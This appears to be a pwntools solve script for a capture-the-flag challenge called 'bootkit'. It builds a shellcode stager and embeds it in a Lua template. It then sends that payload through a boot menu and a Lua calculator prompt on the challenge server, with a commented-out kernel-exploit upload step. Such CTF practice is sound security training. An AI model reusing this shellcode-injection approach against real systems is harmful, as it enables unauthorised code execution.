from pwn import *

os.system("nasm -f bin stager.asm -o stager.bin")
stager = open("stager.bin", "rb").read()

stager = stager.ljust(len(stager) + 7 & ~7, b"\xcc")
parts = [stager[i:i+8] for i in range(0, len(stager), 8)]
final = []
for part in parts:
    content = "".join(f"\\x{byte:02x}" for byte in part)
    final.append(f"\"{content}\"")
final = "..\n".join(final)
template = open("template.lua").read()
template = template.replace("[SHELLCODE]", f"shellcode = {final}")
with open("solve.lua", "w+") as fp:
    fp.write(template)

# context.log_level = "DEBUG"

if args.REMOTE:
    p = remote("bootkit.chal.uiuc.tf", "1337", ssl=True)
else:
    p = process("./run.sh")
p.recvuntil(b"Boot in 4")
p.send(b"\x1b[B")
p.send(b"\n")
p.send(template)
p.send(b"\n")
p.recvuntil(b"Calculator (Lua 5.2)")
p.recvuntil(b"Calculator (Lua 5.2)")
p.send(b"\n")

# from pwnc.kernel.util import remote_upload
# exploit = open("pwn", "rb").read()

# context.log_level = "INFO"

# if args.REMOTE:
#     p.recvuntil(b"/root ")
#     remote_upload(p, exploit, "/root", b"# ")

p.interactive()